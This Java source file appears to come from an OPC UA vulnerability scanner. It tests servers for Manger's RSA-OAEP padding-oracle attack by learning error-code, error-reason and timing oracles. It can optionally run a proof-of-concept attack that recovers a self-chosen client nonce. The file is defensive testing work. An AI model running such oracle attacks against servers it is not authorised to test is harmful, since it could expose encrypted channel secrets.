package vulntest.manger;

import attacks.CipherTextUtility;
import attacks.manger.MangersAttack;
import attacks.manger.oracle.Oracle;
import attacks.manger.oracle.OracleException;
import attacks.manger.oracle.VictimProxy;
import attacks.manger.oracle.learner.*;
import opcua.context.Endpoint;
import opcua.context.LocalKeyPair;
import opcua.context.StaticConfig;
import opcua.encoding.DataTypeConverter;
import opcua.encoding.EncodingException;
import opcua.message.OpenSecureChannelRequest;
import opcua.model.type.SecurityTokenRequestType;
import opcua.model.type.EndpointDescription;
import opcua.security.MessageSecurityMode;
import opcua.security.OAEPUtility;
import opcua.security.SecurityAlgorithm;
import opcua.util.CommonMessageFlows;
import opcua.util.MessageUtility;
import reporting.entry.*;
import reporting.Report;
import transport.SecureChannelUtil;
import transport.TransportException;
import vulntest.VulnerabilityTest;

import java.io.IOException;
import java.time.Duration;
import java.time.LocalDateTime;
import java.time.temporal.ChronoUnit;
import java.util.*;

/**
 * Tests a server regarding their vulnerability to Manger's attack
 */
public class MangerVulnerabilityTest implements VulnerabilityTest {
    private final LocalKeyPair localKeyPair;
    private final boolean performProofOfConceptAttacks;
    private final int numberOfAttempts;
    private final List<OracleLearner> oracleLearners;

    /**
     * Constructor for a default configuration, creates a self-signed certificate
     */
    public MangerVulnerabilityTest() {
        this.localKeyPair = LocalKeyPair.generateSelfSigned(StaticConfig.CERT_KEYSIZE, StaticConfig.CERT_NAME);
        this.oracleLearners = defaultOracleLearners(localKeyPair);
        this.performProofOfConceptAttacks = false;
        this.numberOfAttempts = 10;
    }

    /**
     * Constructor. Uses a self-signed certificate
     * @param performProofOfConceptAttacks Whether proof-of-concept attacks shall be performed
     * @param numberOfAttempts Maximum number of attempts for proof-of-concept attacks
     */
    public MangerVulnerabilityTest(boolean performProofOfConceptAttacks, int numberOfAttempts) {
        this.localKeyPair = LocalKeyPair.generateSelfSigned(StaticConfig.CERT_KEYSIZE, StaticConfig.CERT_NAME);
        this.oracleLearners = defaultOracleLearners(localKeyPair);
        this.performProofOfConceptAttacks = performProofOfConceptAttacks;
        this.numberOfAttempts = numberOfAttempts;
    }

    /**
     * Constructor
     * @param localKeyPair Local certificate
     * @param performProofOfConceptAttacks Whether proof-of-concept attacks shall be performed
     * @param numberOfAttempts Maximum number of attempts for proof-of-concept attacks
     */
    public MangerVulnerabilityTest(LocalKeyPair localKeyPair, boolean performProofOfConceptAttacks, int numberOfAttempts) {
        this.localKeyPair = localKeyPair;
        this.performProofOfConceptAttacks = performProofOfConceptAttacks;
        this.oracleLearners = defaultOracleLearners(localKeyPair);
        this.numberOfAttempts = numberOfAttempts;
    }

    /**
     * Constructor
     * @param localKeyPair Local certificate
     * @param performProofOfConceptAttacks Whether proof-of-concept attacks shall be performed
     * @param numberOfAttempts Maximum number of attempts for proof-of-concept attacks
     * @param oracleLearners The set of oracle learners that are used to find specific vulnerabilities
     */
    public MangerVulnerabilityTest(LocalKeyPair localKeyPair, boolean performProofOfConceptAttacks, int numberOfAttempts, List<OracleLearner> oracleLearners) {
        this.localKeyPair = localKeyPair;
        this.performProofOfConceptAttacks = performProofOfConceptAttacks;
        this.numberOfAttempts = numberOfAttempts;
        this.oracleLearners = oracleLearners;
    }

    private static List<OracleLearner> defaultOracleLearners(LocalKeyPair localKeyPair) {
        List<OracleLearner> oracleLearners = new ArrayList<>();
        oracleLearners.add(new ErrorCodeOracleLearner(localKeyPair, 100));
        oracleLearners.add(new SimpleErrorReasonOracleLearner(localKeyPair, 100));
        oracleLearners.add(new TimingOracleLearner(2000, 10, localKeyPair));
        return oracleLearners;
    }

    @Override
    public Report performTest(Endpoint endpoint) {
        LocalDateTime startTimestamp = LocalDateTime.now();
        Report report = new Report();

        //Find suitable endpoints
        EndpointDescription[]  endpointDescriptions;
        try {
            endpointDescriptions = CommonMessageFlows.retrieveEndpointDescriptions(endpoint);
        } catch (TransportException e) {
            report.getRootEntry().addSubEntry(new ThrowableEntry(e));
            return report;
        }
        EndpointDescription[] suitableEndpoints = filterSuitableEndpoints(endpointDescriptions);

        report.getRootEntry().addSubEntry(new SingleStringEntry("Found " + endpointDescriptions.length + " endpoints. "
                + suitableEndpoints.length + " of which are potentially suitable for Manger's attack."));

        //try to learn oracles
        for(int i=0; i<suitableEndpoints.length; i++) {
            Group endpointGroup = new Group("Endpoint " + (i+1) + ": " + suitableEndpoints[i].getSecurityPolicy() + "(" + suitableEndpoints[i].getEndpointUrl() + ")");
            try {
                testEndpoint(endpoint.getHostName(), endpoint.getPort(), suitableEndpoints[i], endpointGroup);
            } catch (OracleException e) {
                endpointGroup.addSubEntry(new ThrowableEntry(e));
            }
            report.getRootEntry().addSubEntry(endpointGroup);
        }

        LocalDateTime finishTimestamp = LocalDateTime.now();
        long seconds = ChronoUnit.SECONDS.between(startTimestamp, finishTimestamp);


        Group reportInfos = new Group("General report information");
        reportInfos.addSubEntry(new DateTimeEntry("Started at", startTimestamp));
        reportInfos.addSubEntry(new DateTimeEntry("Finished at", finishTimestamp));
        reportInfos.addSubEntry(new DurationEntry("Elapsed time", Duration.of(seconds, ChronoUnit.SECONDS)));
        report.getRootEntry().addSubEntry(reportInfos);

        return report;
    }

    private static EndpointDescription[] filterSuitableEndpoints(EndpointDescription[] endpointDescriptions) {
        Set<EndpointDescription> endpoints = new HashSet<>(Set.of(endpointDescriptions));
        endpoints.removeIf((EndpointDescription ed) ->
                !(ed.getSecurityMode() == MessageSecurityMode.SIGN_AND_ENCRYPT &&
                    ed.getSecurityPolicy().getAsymmetricEncryption() == SecurityAlgorithm.RSA_OAEP)
        );
        return endpoints.toArray(new EndpointDescription[0]);
    }

    private void testEndpoint(String hostName, int port, EndpointDescription endpointDescription, Group reportingGroup) throws OracleException {
        if(oracleLearners.isEmpty()) {
            reportingGroup.addSubEntry(new SingleStringEntry("No OracleLearners specified"));
        }

        Endpoint endpoint = new Endpoint(
                hostName,
                port,
                endpointDescription.getEndpointUrl(),
                endpointDescription.getServerCertificate(),
                endpointDescription.getSecurityPolicy(),
                endpointDescription.getSecurityMode()
        );

        for(OracleLearner oracleLearner : oracleLearners) {
            LearningResult result = oracleLearner.learn(endpoint);
            if (performProofOfConceptAttacks && result.isSuccessful()) {
                Group attackReport;
                boolean successful = false;
                int attempts = 0;
                do {
                    attempts++;
                    attackReport = new Group("Proof-of-Concept Attack (Attempt " + attempts + ")");
                    successful = proofOfConceptAttack(endpoint, result.getOracle(), attackReport);
                } while (!successful && attempts <= numberOfAttempts);
                result.getReport().addSubEntry(attackReport);
            }
            reportingGroup.addSubEntry(result.getReport());
        }
    }

    private boolean proofOfConceptAttack(Endpoint endpoint, Oracle oracle, Entry report) {
        try {
            byte[] clientNonceFlag = SecureChannelUtil.generateRandomNonce(endpoint.getSecurityPolicy());
            OpenSecureChannelRequest opnRequest = new OpenSecureChannelRequest(
                    StaticConfig.PROTOCOL_VERSION,
                    SecurityTokenRequestType.ISSUE,
                    endpoint.getMessageSecurityMode(),
                    clientNonceFlag,
                    StaticConfig.REQUESTED_LIFETIME
            );
            boolean successful = false;
            byte[] ciphertext = MessageUtility.getSignedEncrypted(opnRequest, endpoint, localKeyPair);
            VictimProxy victimProxy = new VictimProxy(endpoint, ciphertext);
            oracle.setVictimProxy(victimProxy);
            MangersAttack attack = new MangersAttack(CipherTextUtility.extractCipherBlock(ciphertext, 0, localKeyPair.getPublicKey()), oracle, endpoint.getPublicKey());

            byte[] oaepEncodedPlaintext, plaintext;
            byte[] recoveredFlag = null;
            try {
                oaepEncodedPlaintext = attack.executeAttack();
                plaintext = OAEPUtility.decode(oaepEncodedPlaintext);
                recoveredFlag = Arrays.copyOfRange(plaintext, 57, 57 + endpoint.getSecurityPolicy().getSymmetricEncryptionNonceLength());
                successful = Arrays.compare(clientNonceFlag, recoveredFlag) == 0;
            } catch (OracleException | EncodingException e) {
                report.addSubEntry(new ValueEntry<>("Success", false));
                report.addSubEntry(new ValueEntry<>("Flag Nonce", DataTypeConverter.bytesToHexString(clientNonceFlag)));
                report.addSubEntry(new ValueEntry<>("Recovered Nonce", DataTypeConverter.bytesToHexString(recoveredFlag)));
                report.addSubEntry(new ValueEntry<>("Oracle Queries", oracle.getQueryCount()));
                report.addSubEntry(new ThrowableEntry(e));
                return false;
            }

            report.addSubEntry(new ValueEntry<>("Success", successful));
            report.addSubEntry(new ValueEntry<>("Flag Nonce", DataTypeConverter.bytesToHexString(clientNonceFlag)));
            report.addSubEntry(new ValueEntry<>("Recovered Nonce", DataTypeConverter.bytesToHexString(recoveredFlag)));
            report.addSubEntry(new ValueEntry<>("Oracle Queries", oracle.getQueryCount()));
            return successful;
        }
        catch (IOException | EncodingException e) {
            report.addSubEntry(new SingleStringEntry("Unable to set up proof-of-concept attack"));
            report.addSubEntry(new ThrowableEntry(e));
            return false;
        }
    }
}
